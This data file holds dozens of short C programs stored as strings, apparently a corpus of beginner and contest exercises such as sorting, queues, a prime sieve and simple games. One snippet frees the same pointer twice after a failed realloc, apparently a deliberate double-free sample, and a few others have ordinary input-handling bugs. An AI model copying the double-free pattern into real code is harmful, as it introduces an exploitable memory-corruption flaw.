    "#include <stdio.h>\n#include <float.h>\n#include <stdbool.h>\n_Bool valid_triangle(float a, float b, float c);\nfloat get_input(void);\nint main(void){\n _Bool answer;\n puts(\"You will enter three real numbers\\nand decide if it can form a triangle\");\n puts(\"With those three values\");\n  answer = valid_triangle(get_input(), get_input(), get_input());\n  printf(\"%i\\n\", answer);\n}\n_Bool valid_triangle(float a, float b, float c){\n  if (a <= 0 || b <= 0 || c <= 0)\n    return 0;\n  else if ((a + b <= c) || (a + c <= b) || (b + c <= a))\n    return 0;\n  else\n    return 1;\n}\nfloat get_input(void){\n  float sides;\n  puts(\"Enter a real number for one the triangle sides:\");\n  scanf(\"%f\\n\", &sides);\n  return sides;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    typedef float nota;\n    nota prova1 = 6.0;\n    nota prova2 = 7.0;\n    nota soma = prova1 + prova2;\n    printf(\"A soma das notas e %.2f\\n\", soma);\n    return 0;\n}",
    "int main() {\n  char **argv;\n  int *names[10];\n  int (*student_score_table)[10];\n  int *StrCpyStd(char *dest, const char *src);\n  int (*comp)(const void *left, const void *right);\n  char (*(*func(int num, char *str))[])();\n  char (*(*arr[3])())[5];\n}",
    "#include <sys/types.h>\n#include <unistd.h>\n#include <stdio.h>\nint main()\n{\n  uid_t uid = geteuid ();\n  gid_t gid = getegid ();\n  printf (\"uid=%d gid=%d\\n\", uid, gid);\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n\nvoid MaxMusic(long int *musicas, long int ref,long int i , long int f, long int *soma){\n if(i <= f-1){\n  if(musicas[i]+musicas[f] > ref)\n   MaxMusic(musicas, ref, i, f-1, soma);\n  else if(musicas[i]+musicas[f] < ref){\n            *soma = (musicas[i] + musicas[f] > *soma)?(musicas[i] +musicas[f]) : (*soma);\n   MaxMusic(musicas, ref, i+1, f, soma);\n  }\n  else{\n            *soma = musicas[i] + musicas[f];\n        }\n }\n return;\n}\nvoid Merge(long int *musicas, long int i, long int f){\n long int cont = 0, q = (i+f)/2 ;\n long int tam = (f-i)+1, faux = tam-1, iaux = 0;\n    long int aux[tam];\n if(i == f)\n  return;\n else{\n  Merge(musicas, i, q);\n  Merge(musicas, q+1, f);\n }\n while(iaux < faux){\n        aux[iaux++] = musicas[i + cont];\n        aux[faux--] = musicas[q +1+ cont++];\n }\n    if(iaux == faux) aux[iaux] = musicas[i + cont];\n long int ia=0, ja=0;\n ia = 0;\n ja = tam-1;\n cont = i;\n while(ia <= ja){\n  musicas[cont++] = (aux[ia] <= aux[ja])?aux[ia++]:aux[ja--];\n }\n return;\n}\nvoid printar(long int *vet, long int tm){\n    long int cont =0 ;\n    for(cont=0; cont < tm; cont++)\n        printf(\"%li \", vet[cont]);\n}\nint main(){\n long int num = 0, x = 0, cont=0;\n long int soma;\n    soma = -1;\n scanf(\"%li %li\", &num, &x);\n long int musicas[num];\n while(cont<num)\n  scanf(\"%li\", &musicas[cont++]);\n Merge(musicas, 0, num-1);\n MaxMusic(musicas, x, 0, num-1, &soma);\n    if(soma == -1)\n        printf(\"NONE\");\n    else\n        printf(\"%li\", soma);\n}",
    "#include<stdio.h>\n#include<limits.h>\nint main() {\n    int var1 = (-2147483647 -1);\n    int var2 = 2147483647;\n    unsigned int var3 = 0;\n    unsigned int var4 = (2147483647 *2U +1U);\n    short int var5 = (-32767 -1);\n    short int var6 = 32767;\n    unsigned short int var7 = 0;\n    unsigned short int var8 = (32767 *2 +1);\n    printf(\"Range of signed integer is from: %d to %d\", var1, var2);\n    printf(\"\\nRange of unsigned integer is from: %u to %u\", var3, var4);\n    printf(\"\\nRange of short integer is from: %d to %d\", var5, var6);\n    printf(\"\\nRange of short unsigned integer is from: %u to %u\", var7, var8);\n    return 0;\n}",
    "\n\n\n\n\nint build1_stat (int a, double d, int b) { return a; }\n\nint main (void) { return build1_stat (0, 1.0, 2); }",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n    int t, sum = 0, x;\n    char str[20];\n    scanf(\"%d\", &t);\n    while(t--) {\n        scanf(\"%s\", str);\n        if(!strcmp(str, \"donate\")) {\n            scanf(\"%d\", &x);\n            sum += x;\n        } else {\n            printf(\"%d\\n\", sum);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n int a , b;\n printf(\"Enter 2 integer: \");\n scanf(\"%d %d\", &a, &b);\n printf(\"%d\\n\", a + b);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int day;\n  printf(\"Enter a number from 1 to 7 to display the day:\");\n  scanf(\"%d\", &day);\n  switch(day) {\n  case 1:\n    printf(\"Monday\\n\");\n    break;\n  case 2:\n    printf(\"Tuesday\\n\");\n    break;\n  case 3:\n    printf(\"Wednesday\\n\");\n    break;\n  case 4:\n    printf(\"Thursday\\n\");\n    break;\n  case 5:\n    printf(\"Friday\\n\");\n    break;\n  case 6:\n    printf(\"Saturday\\n\");\n    break;\n  case 7:\n    printf(\"Sunday\\n\");\n    break;\n  }\n  printf(\"Thank you for using the program.\\n\");\n}",
    "#include<stdio.h>\nint main(){\n FILE *ri = fopen(\"int.txt\", \"r\");\n int c[5], i=-1;\n while(!feof(ri)){\n  i++;\n  fscanf(ri, \"%d\", &c[i]);\n }\n for(i=0; i<4; i++)\n  printf(\"%d\\t\", c[i]);\n return 0;\n}",
    "#include <stdio.h>\n\nint front=-1,rear=-1;\nvoid addq(int Que[], int Val);\nint delq(int Que[]);\nint IsQueueEmpty();\nint main()\n{\n       int que[5];\n       int val,n=0;\n       while(n!=3)\n       {\n  printf(\"\\n1. Adding an element into the queue\\n\");\n  printf(\"2. Deleting an element from the queue\\n\");\n  printf(\"3. Quit\\n\");\n  printf(\"Enter your choice 1/2/3: \");\n  scanf(\"%d\",&n);\n  switch(n)\n  {\n   case 1: if(rear >=5 -1)\n      printf(\"Sorry the queue is full\\n\");\n     else\n     {\n      printf(\"Enter the value to add to queue: \");\n      scanf(\"%d\",&val);\n      addq(que,val);\n      printf(\"Value %d is added to queue\\n\", val);\n     }\n     break;\n   case 2: if(!IsQueueEmpty())\n    {\n     val=delq(que);\n      printf(\"Value removed from queue %d\\n\",val);\n    }\n    else\n    printf(\"Sorry, the queue is empty\\n\");\n      break;\n  }\n }\n return 0;\n}\nvoid addq(int Que[], int Val)\n{\n rear++;\n Que[rear]=Val;\n if(front==-1)\n  front=rear;\n}\nint IsQueueEmpty()\n{\n if(front==-1)\n   return (1);\n else\n  return (0);\n}\nint delq(int Que[])\n{\n int val;\n  if(front==rear)\n  {\n   val=Que[front];\n   front=-1;\n   rear=-1;\n  }\n  else\n  {\n   val=Que[front];\n   front++;\n  }\n  return(val);\n}",
    "#include <stdio.h>\nint main()\n{\n    float base, altura, area;\n    do\n    {\n        printf(\"Digite a BASE e a ALTURA do triangulo: \");\n        scanf(\"%f%f\", &base, &altura);\n    } while (base <= 0 || altura <= 0);\n    area = (base * altura) / 2;\n    printf(\"A area do traingulo eh: %.2f\", area);\n    return 0;\n}",
    "#include<stdio.h>\nint main() {\n    int year, month;\n    printf(\"\\n\\tEnter the year : \");\n    scanf(\"%d\",&year);\n    printf(\"\\n\\tEnter the month  of %d year in digit : \",year);\n    scanf(\"%d\",&month);\n    if(month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {\n        printf(\"\\n\\tNumber of days is 31\");\n    }\n    else if((month == 2) && ((year % 400 == 0) || (year % 4 == 0 && year % 100 != 0))) {\n        printf(\"\\n\\tNumber of days is 29\");\n    }\n    else if(month == 2) {\n        printf(\"\\n\\tNumber of days is 28\");\n    }\n    else {\n        printf(\"\\n\\tNumber of days is 30\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint contaVocali(char *str);\nint main() {\n  char str[30 + 1];\n  int res;\n  scanf(\"%[^\\n]\", str);\n  res = contaVocali(str);\n  printf(\"%d\\n\", res);\n  return 0;\n}\nint contaVocali(char *str) {\n  int count;\n  for (count = 0; *str != '\\0'; str++) {\n    switch (*str) {\n    case 'a':\n    case 'e':\n    case 'i':\n    case 'o':\n    case 'u':\n    case 'A':\n    case 'E':\n    case 'I':\n    case 'O':\n    case 'U':\n      count++;\n    }\n  }\n  return count;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    register unsigned short int i;\n    for (i = 1; i < 1716; i++) {\n        if (i % 13 == 12 && i % 12 == 4 && i % 11 == 10) {\n            printf(\"%u\\n\", i);\n            return 0;\n        }\n    }\n    return 1;\n}",
    "#include <stdio.h>\nint main(void) {\n  printf(\"DEBUG> %d\\n\", 10 | 136);\n  return 10 | 136;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <ctype.h>\n\n\nint main (void) {\n  int hx, hy, hz, x, y, z, c;\n  char yesno;\n  printf (\"Hurkle Hunt in 3D\\n\\n\"\n  \"A hurkle is a cute little creature, that in this game can fly. The hurkle\\n\"\n  \"is hiding in a region %d x %d x %d. After every guess your special hurkle\\n\"\n  \"locator will tell you which way you need to go. Keep in mind that 1,1,1 is\\n\"\n  \"the lowest northwest corner.\\n\", 10, 10, 10);\n  printf (\"Input your move by typing the x then y then z coordinate seperated\\n\"\n  \"by commas like \\\"1,2,3\\\"\\n\\n\");\n  srand (time (((void*)0)));\n  do {\n    hx = rand () % 10 +1;\n    hy = rand () % 10 +1;\n    hz = rand () % 10 +1;\n    printf (\"The hurkle is ready.\");\n    for (c = 1; c <= 10 && !(x == hx && y == hy && z == hz); c++) {\n      printf (\"\\nWhere do you want to look? (X,Y,Z) : \");\n      scanf (\"%d %*c %d %*c %d\", &x, &y, &z);\n      printf (\"The hurkle is \");\n      if (y < hy) printf (\"south\");\n      if (y > hy) printf (\"north\");\n      if (x < hx) printf (\"east\");\n      if (x > hx) printf (\"west\");\n      if ((x != hx || y != hy) && z != hz) printf (\" and \");\n      if (z < hz) printf (\"up\");\n      if (z > hz) printf (\"down\");\n    }\n    if (c <= 10) printf (\"HERE!\\nYou found the hurkle!\\n\\n\");\n    else printf (\"\\nThats %d trys and you didn't find the hurkle.\\n\"\n      \"The hurkle was hiding at %d, %d, %d.\\n\\n\", 10, hx, hy, hz);\n    printf (\"Would you like to play again? (y/n) \");\n    while (!(0 ? isalpha(yesno = getchar()) : (((unsigned)(yesno = getchar())|32)-'a') < 26));\n  } while (tolower (yesno) != 'n');\n  printf (\"Good bye for now!\");\n  exit (0);\n}",
    "#include<stdio.h>\n#include<math.h>\ndouble add(double a, double b){\n    return a + b;\n}\ndouble substract(double a, double b){\n    return a - b;\n}\ndouble multiply(double a, double b){\n    return a * b;\n}\ndouble divide(double a, double b){\n    return a / b;\n}\ndouble powerOf(double a, double b){\n    double result;\n    if(b == 0){\n        result = 1;\n    }\n    else if(b > 0){\n        result = 1;\n        for(int i=0;i < b;i++){\n            result *= a;\n        }\n    }\n    else{\n        result = -1;\n    }\n    return result;\n}\nint main(){\n    double a,b;\n    double sum,difference,product,quotient;\n    printf(\"Insert an integer:\");\n    scanf(\"%lf\",&a);\n    printf(\"Insert another integer:\");\n    scanf(\"%lf\",&b);\n    sum = add(a,b);\n    difference = substract(a,b);\n    product = multiply(a,b);\n    quotient = divide(a,b);\n    double power = powerOf(a,b);\n    printf(\"%lf+%lf is equal to %lf\\n\",a,b,sum);\n    printf(\"%lf-%lf is equal to %lf\\n\",a,b,difference);\n    printf(\"%lf*%lf is equal to %lf\\n\",a,b,product);\n    printf(\"%lf/%lf is equal to %lf\\n\",a,b,quotient);\n    printf(\"%lf^%lf is equal to %lf\\n\",a,b,power);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n int ch;\n int line;\n int at_begining;\n line = 0;\n at_begining = 1;\n while((ch=getchar()) != (-1)) {\n  if(at_begining == 1) {\n   at_begining = 0;\n   line += 1;\n   printf(\"%d: \", line);\n  }\n putchar(ch);\n if(ch == '\\n')\n  at_begining = 1;\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid henoiTower(int n, char from, char to, char aux)\n{\n    if(n==1)\n    {\n        printf(\"\\n Move disk %d from rod %c to rod %c\", n, from, to);\n        return;\n    }\n    henoiTower(n-1, from, aux, to);\n    printf(\"\\n Move disk %d from rod %c to rod %c\", n, from, to);\n    henoiTower(n-1, aux, to, from);\n}\nint main()\n{\n    int i=3;\n    henoiTower(i,'A','B','C');\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){\n char name[1024], line[1024];\n FILE *fp;\n printf(\"%s \\n\", tmpnam(((void*)0)));\n tmpnam(name);\n if((fp = tmpfile()) == ((void*)0)){\n  perror(\"tempfile error\");\n }\n fputs(\"one line if output\\n\",fp);\n rewind(fp);\n if(fgets(line, sizeof(line), fp) == ((void*)0)){\n  perror(\"fgets error\");\n }\n fputs(line , (stdout));\n sleep(100);\n exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <string.h>\nstatic inline int max(int a, int b)\n{\n    return a > b ? a : b;\n}\nstatic int area_calc(int *heights, int size)\n{\n    int *indexes = malloc(size * sizeof(int));\n    int *left = malloc(size * sizeof(int));\n    int *right = malloc(size * sizeof(int));\n    int i, pos = 0;\n    for (i = 0; i < size; i++) {\n        while (pos > 0 && heights[indexes[pos - 1]] >= heights[i]) {\n            pos--;\n        }\n        left[i] = pos == 0 ? -1 : indexes[pos - 1];\n        indexes[pos++] = i;\n    }\n    pos = 0;\n    for (i = size - 1; i >= 0; i--) {\n        while (pos > 0 && heights[indexes[pos - 1]] >= heights[i]) {\n            pos--;\n        }\n        right[i] = pos == 0 ? size : indexes[pos - 1];\n        indexes[pos++] = i;\n    }\n    int max_area = 0;\n    for (i = 0; i < size; i++) {\n        int area = heights[i] * (right[i] - left[i] - 1);\n        max_area = max(area, max_area);\n    }\n    return max_area;\n}\nstatic int maximalRectangle(char** matrix, int matrixRowSize, int matrixColSize)\n{\n    int i, j, max_area = 0;\n    int *heights = malloc(matrixColSize * sizeof(int));\n    memset(heights, 0, matrixColSize * sizeof(int));\n    for (i = 0; i < matrixRowSize; i++) {\n        for (j = 0; j < matrixColSize; j++) {\n            heights[j] = matrix[i][j] == '1' ? heights[j] + 1 : 0;\n        }\n        max_area = max(max_area, area_calc(heights, matrixColSize));\n    }\n    return max_area;\n}\nint main(int argc, char **argv)\n{\n    if (argc < 2) {\n        fprintf((stderr), \"Usage: ./test row1 row2...\\n\");\n        exit(-1);\n    }\n    int i, j;\n    int row_size = argc - 1;\n    int col_size = strlen(argv[1]);\n    for (i = 0; i < row_size; i++) {\n        printf(\"%s\\n\", argv[i + 1]);\n    }\n    printf(\"%d\\n\", maximalRectangle(argv + 1, argc - 1, strlen(argv[1])));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid degistir(int* n1, int* n2, int* n3)\n{\n    int temp1, temp2;\n    temp2 = *n2;\n    temp1 = *n1;\n    *n1 = temp2;\n    *n2 = *n3;\n    *n3 = temp1;\n}\nint main()\n{\n        int num1 = 9, num2 = 27 , num3 = 45;\n       degistir( &num1, &num2 , &num3);\n        printf(\"num1 = %d\\n\", num1);\n        printf(\"num2 = %d\\n\", num2);\n        printf(\"num3 = %d\\n\", num3);\n        return 0;\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nlong long llmin(long long a, long long b)\n{\n return a < b ? a : b;\n}\nlong long pos[59], pwr[59];\nlong long n, c;\nlong long pwrpre[1009];\nlong long unit_cost(int l, int r)\n{\n return pwrpre[l - 1] + pwrpre[n] - pwrpre[r];\n}\nlong long dist(int l, int r)\n{\n return pos[r] - pos[l];\n}\nlong long mem[1009][1009][2];\nlong long calc(int l, int r, int is_l)\n{\n if (mem[l][r][is_l] >= 0)\n  return mem[l][r][is_l];\n if (l == r) {\n  if (r == c)\n   return 0;\n  return 0x3f3f3f3f;\n }\n if (is_l)\n  return mem[l][r][1] =\n   llmin(calc(l + 1, r, 1) + unit_cost(l + 1, r) *\n    dist(l, l + 1), calc(l + 1, r, 0) +\n    unit_cost(l + 1, r) * dist(l, r));\n return mem[l][r][0] =\n  llmin(calc(l, r - 1, 0) + unit_cost(l, r - 1) *\n   dist(r - 1, r), calc(l, r - 1, 1) +\n   unit_cost(l, r - 1) * dist(l, r));\n}\nint main(void)\n{\n long long i;\n\n\n\n\n scanf(\"%lld%lld\", &n, &c);\n for (i = 1; i <= n; ++i)\n  scanf(\"%lld%lld\", &pos[i], &pwr[i]);\n for (i = 1; i <= n; ++i)\n  pwrpre[i] = pwrpre[i - 1] + pwr[i];\n memset(mem, -1, sizeof(mem));\n printf(\"%lld\\n\", llmin(calc(1, n, 0), calc(1, n, 1)));\n return 0;\n}",
    "#include<stdio.h>\nint r,c,p[100][100],q[100][100]={0};\nvoid dp(int i,int j)\n{\n int x=-1;\n if (q[i][j]!=0)\n  return ;\n if (i>0 && p[i-1][j]>p[i][j])\n {\n  if (q[i-1][j]==0)\n   dp(i-1,j);\n  if (q[i-1][j]>x)\n   x=q[i-1][j];\n }\n if (i<r-1 && p[i+1][j]>p[i][j])\n {\n  if (q[i+1][j]==0)\n   dp(i+1,j);\n  if (q[i+1][j]>x)\n   x=q[i+1][j];\n }\n if (j>0 && p[i][j-1]>p[i][j])\n {\n  if (q[i][j-1]==0)\n   dp(i,j-1);\n  if (q[i][j-1]>x)\n   x=q[i][j-1];\n }\n if (j<c-1 && p[i][j+1]>p[i][j])\n {\n  if (q[i][j+1]==0)\n   dp(i,j+1);\n  if (q[i][j+1]>x)\n   x=q[i][j+1];\n }\n q[i][j]=x+1;\n}\nint main()\n{\n int i,j,m=0;\n scanf(\"%d%d\",&r,&c);\n for (i=0;i<r;i++)\n  for (j=0;j<c;j++)\n   scanf(\"%d\",&p[i][j]);\n for (i=0;i<r;i++)\n {\n  for (j=0;j<c;j++)\n  {\n   dp(i,j);\n   if (q[i][j]>m)\n    m=q[i][j];\n  }\n }\n printf(\"%d\\n\",m+1);\n return 0;\n}",
    "int main()\n{\n  int error = -5;\n  int nonerror = -5;\n  int sum = nonerror + !error;\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid insSort(int *, int);\nvoid display(int *, int);\nint main()\n{\n int size = 0, i = 0;\n printf(\"How many elements would to like to add to your list?\\n\");\n scanf(\"%d\", &size);\n int list[size];\n printf(\"Please enter the elements.\\n\");\n for(i = 0; i < size; i++)\n  scanf(\"%d\", &list[i]);\n printf(\"The list you have entered is \");\n display(list, size);\n printf(\".\\n\");\n printf(\"The sorted list with each iteration is as follows:\\n\");\n insSort(list, size);\n return 0;\n}\nvoid insSort(int *list,int size)\n{\n int i = 0, j = 0, pivot = 0;\n for(i = 1; i < size; i++)\n {\n  pivot = list[i];\n  j = i - 1;\n  while(j >= 0 && list[j] > pivot)\n  {\n   list[j + 1] = list[j];\n   j--;\n   list[j + 1] = pivot;\n  }\n  display(list, size);\n  printf(\"\\n\");\n }\n}\nvoid display(int *list, int size)\n{\n int i = 0;\n for(i = 0; i < size; i++)\n  printf(\"%d \", list[i]);\n}",
    "#include <stdio.h>\n#include <math.h>\nint quadrados(int n){\n int z = 0;\n while(n!=0)\n {\n  z+=pow(n,2);\n  n--;\n }\n return z;\n}\nint main(int argc, char** argv)\n{\n int x = 1;\n while(x!=0){\n  scanf(\"%i\",&x);\n  x = quadrados(x);\n  if(x != 0)\n   printf(\"%i\\n\",x);\n }\n return 0;\n}",
    "#include <stdio.h>\nint m[1991][1991];\nint i, j, N;\nint main(){\n scanf(\"%d\", &N);\n for(i = 0; i < N; i++)\n  for(j = 0; j < N; j++)\n   scanf(\"%d\", &m[i][j]);\n printf(\"Array(\");\n for(i = 0; i < N - 1; i++){\n  printf(\"Array(%d\", m[i][0]);\n  for(j = 1; j < N; j++)\n   printf(\",%d\", m[i][j]);\n  printf(\"),\\n \");\n }\n printf(\"Array(%d\", m[N - 1][0]);\n for(j = 1; j < N; j++)\n  printf(\",%d\", m[i][j]);\n printf(\"))\");\n return 0;\n}",
    "#include <stdio.h>\n\n\nint isWhitespace(int character) {\n  return character == ' ' || character == '\\n' || character == '\\t';\n}\nint main(void) {\n  int character, state = 1;\n  while ((character = getchar()) != (-1)) {\n    if (!isWhitespace(character)) {\n      state = 0;\n      putchar(character);\n    } else if (state == 0) {\n      state = 1;\n      putchar('\\n');\n    }\n  }\n  return 0;\n}",
    "int main(){\n    int i = 0;\n    while(i < 0)\n        i++;\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint values[] = {0xDEADBEEF, 0xBABAFAFA};\nint main(void) {\n    while (1)\n        sleep(1);\n}",
    "#include<stdio.h>\nint main()\n{\n int i,j,n,m,temp;\n printf(\"Enter the sizeof the array\\n\");\n scanf(\"%d\",&n);\n int a[n];\n for(i=0;i<n;i++)\n  scanf(\"%d\",&a[i]);\n   for(i=0;i<n;i++)\n   {\n    for(j=i;j<n;j++)\n    {\n     if(a[i]>a[j])\n     {temp=a[j];a[j]=a[i];a[i]=temp;}\n    }\n   }\n printf(\"Sorted Array:\\n\");\n for(i=0;i<n;i++)\n  printf(\"%d   \",a[i]);\nreturn 0;\n}",
    "#include <stdlib.h>\nint main(void)\n{\n    void *ptr1 = malloc(sizeof(char));\n    if (ptr1 == ((void*)0))\n        return 0;\n    void *ptr2 = realloc(ptr1, 2 * sizeof(char));\n    if (ptr2 == ((void*)0)) {\n        free(ptr1);\n        free(ptr1);\n        return 0;\n    }\n    free(ptr2);\n}",
    "#include <stdio.h>\nint main(void)\n{\n    printf(\"hello, world\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <stdlib.h>\nint main(void) {\n    int c;\n    while ((c = getc((stdin))) != (-1))\n        if (putc(c, (stdout)) == (-1)) {\n            perror(\"Error\");\n            exit(1);\n        }\n    if (feof((stdin))) {\n        perror(\"Error\");\n        exit(1);\n    }\n    exit(0);\n}",
    "#include <stdio.h>\nint main() {\n    for (int i = 1; i < 1000000000; i++) {\n        if ((i % 3 == 0) && (i % 5 == 0)) {\n            printf(\"FizzBuzz\\n\");\n        } else if (i % 3 == 0) {\n            printf(\"Fizz\\n\");\n        } else if (i % 5 == 0) {\n            printf(\"Buzz\\n\");\n        } else {\n            printf(\"%d\\n\", i);\n        }\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid printHelp()\n{\n printf(\"Uso: impostos [pre\u00e7o]. Decimal separado por um ponto.\\nexemplo: impostos 19.99\\n\");\n}\nint main(int argc, char** argv)\n{\n float pre\u00e7o = 0;\n const float ICMS = 0.17;\n const float COFINS = 0.076;\n const float PISPASEP = 0.0165;\n if (argc != 2)\n {\n  printHelp();\n  return 1;\n }\n pre\u00e7o = atoi(argv[1]);\n float imposto_final = (1 + ICMS + COFINS + PISPASEP) * pre\u00e7o;\n printf(\"O imposto sobre o produto de pre\u00e7o %g \u00e9 %g\\n\", pre\u00e7o, imposto_final);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int a, b;\n    printf(\"Digite o valor de A:\\n\");\n    scanf(\"%d\", &a);\n    printf(\"Digite o valor de B:\\n\");\n    scanf(\"%d\", &b);\n    b = a + b;\n    a = b - a;\n    b = b - a;\n    printf(\"A = %d\\n\", a);\n    printf(\"B = %d\\n\", b);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid update(int *a, int *b)\n{\n    int *x;\n    *a += *b;\n    *b = abs(*b - (*a - *b));\n}\nint main()\n{\n    int a, b;\n    int *pa = &a, *pb = &b;\n    scanf(\"%d %d\", &a, &b);\n    update(pa, pb);\n    printf(\"%d\\n%d\", a, b);\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n int d12,d11,d10,d9,d8,d7,d6,d5,d4,d3,d2,d1,sum1,sum2,total,check_digit;\n printf(\"Enter the first 12 digits of an EAN: \");\n scanf(\"%1d%1d%1d%1d%1d%1d%1d%1d%1d%1d%1d%1d\",\n     &d12,&d11,&d10,&d9,&d8,&d7,&d6,&d5,&d4,&d3,&d2,&d1);\n sum1=d11+d9+d7+d5+d3+d1;\n sum2=d12+d10+d8+d6+d4+d2;\n total=sum1*3+sum2;\n check_digit=9-((total-1)%10);\n printf(\"Check digit: %1d\",check_digit);\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint lengthOfLongestSubstring(char* s) {\n    int longest = 0, currentLength = 0, start = 0, position[128] = {0};\n    int i, j;\n    for(i = 0; s[i]; position[s[i]] = ++i, currentLength++) {\n        printf(\"bef: longest = %d, currentLength = %d, start = %d\\n\",\n                longest, currentLength, start);\n        for (j = 0; j < 128; ++j) {\n            if (position[j]) {\n                printf(\"pos[%c] = %d \", j, position[j]);\n            }\n        }\n        printf(\"\\n\");\n        if(position[s[i]] > start) {\n            longest = (longest > currentLength) ? longest : currentLength;\n            start = position[s[i]];\n            currentLength = i - position[s[i]];\n        }\n        printf(\"aft: longest = %d, currentLength = %d, start = %d\\n\",\n                longest, currentLength, start);\n        for (j = 0; j < 128; ++j) {\n            if (position[j]) {\n                printf(\"pos[%c] = %d \", j, position[j]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return (longest > currentLength) ? longest : currentLength;\n}\nint main(int argc, char **argv) {\n    char * s = \"multimonial\";\n    if (argc >= 2) s = argv[1];\n    printf(\"%d\", lengthOfLongestSubstring(s));\n    return 0;\n}",
    "#include <stdio.h>\n#include <time.h>\n#include <stdlib.h>\n\ndouble *arr_init(unsigned int size);\ndouble *arr_rand(double *arr, unsigned int arr_size, int min, int max);\ndouble *arr_print(double *arr, unsigned int arr_size);\ndouble *arr_extremes(double *arr, unsigned int arr_size, double *min, double *max);\nint main() {\n    srand(time(((void*)0)));\n    int loop = 1;\n    while(loop) {\n        unsigned int size = 0;\n        printf(\"How many elements would you like to store? : \");\n        scanf(\"%d\", &size);\n        double *my_arr = arr_init(size);\n        printf(\"Would you like to initialize an array with random numbers between 0 and 100? [Y/N] : \");\n        char yn;\n        scanf(\" %c\", &yn);\n        fflush((stdin));\n        if(yn == 'y' || yn == 'Y') arr_rand(my_arr, size, 0, 100);\n        else {\n            for(int i = 0; i < size; i++) {\n                printf(\"Provide element nr %d : \", i);\n                scanf(\"%lf\", my_arr+i);\n            }\n        }\n        arr_print(my_arr, size);\n        double min, max;\n        arr_extremes(my_arr, size, &min, &max);\n        printf(\"MIN: %lf, MAX: %lf \\n\", min, max);\n        free(my_arr);\n        printf(\"Would you like to run program again? [Y/N] : \");\n        scanf(\" %c\", &yn);\n        if(yn == 'n' || yn == 'N') loop = 0;\n    }\n    printf(\"Goodbye!\\n\");\n    return 0;\n}\ndouble *arr_init(unsigned int size) {\n    unsigned int alloc_size = ((size / 10) + 1 ) * 10;\n    double *arr = ((void*)0);\n    arr = (double*) calloc(alloc_size, sizeof(double));\n    return arr;\n}\ndouble *arr_rand(double *arr, unsigned int arr_size, int min, int max) {\n    for(int i = 0; i < arr_size; i++) {\n        arr[i] = (double)(rand() % (max - (min) + 1)) + (min);\n    }\n    return arr;\n}\ndouble *arr_print(double *arr, unsigned int arr_size) {\n    for(int i = 0; i < arr_size; i++) {\n        printf(\"[%d] = %lf \\n\", i, arr[i]);\n    }\n    return arr;\n}\ndouble *arr_extremes(double *arr, unsigned int arr_size, double *min, double *max) {\n    for(int i = 0; i < arr_size; i++) {\n        if(i == 0) {\n            *max = arr[i];\n            *min = arr[i];\n            continue;\n        }\n        if(arr[i] > *max) *max = arr[i];\n        if(arr[i] < *min) *min = arr[i];\n    }\n    return arr;\n}",
    "#include<stdio.h>\nint main()\n{\n    int a,b;\n    double c;\n    scanf(\"%d\",&a);\n    scanf(\"%d\",&b);\n    scanf(\"%lf\",&c);\n    printf(\"NUMBER = %d\\n\",a);\n    printf(\"SALARY = U$ %.2f\\n\", b*c );\n    return 0;\n}",
    "#include <stdio.h>\nvoid print_bit(short num)\n{\n unsigned short mask = 1;\n mask <<= sizeof(short)*8 - 1;\n while(mask)\n {\n  if(num&mask)\n   printf(\"1\");\n  else\n   printf(\"0\");\n  mask >>= 1;\n }\n printf(\"\\n\");\n}\nint main()\n{\n short num;\n scanf(\"%hd\",&num);\n print_bit(num);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nchar testaPrimos[60102];\nint primos[60102 / 5];\nint contPrimos;\nvoid crivo(){\n    int i, j;\n    contPrimos = 0;\n    memset(testaPrimos, 1, sizeof(testaPrimos));\n    testaPrimos[0] = 0;\n    testaPrimos[1] = 0;\n    for(i = 2; i < 60102; i++){\n        if(testaPrimos[i] == 1){\n            primos[contPrimos++] = i;\n            for(j = i + i; j < 60102; j += i){\n                testaPrimos[j] = 0;\n            }\n        }\n    }\n}\nint main(){\n    int i, peso;\n    crivo();\n    scanf(\"%d\", &peso);\n    for(i = 0; i < contPrimos; i++){\n        if(primos[i] >= peso){\n            printf(\"%d \", primos[i]);\n        }\n    }\n    printf(\"\\n\");\n}",
    "#include <math.h>\n#include <stdio.h>\nunsigned int euclidGCD(unsigned int a, unsigned int b);\nint main(int argc, char const *argv[])\n{\n    printf(\"%d\\n\", euclidGCD(30, 21));\n    return 0;\n}\nunsigned int euclidGCD(unsigned int a, unsigned int b)\n{\n    if (b == 0)\n        return a;\n    else\n        return euclidGCD(b, a % b);\n}",
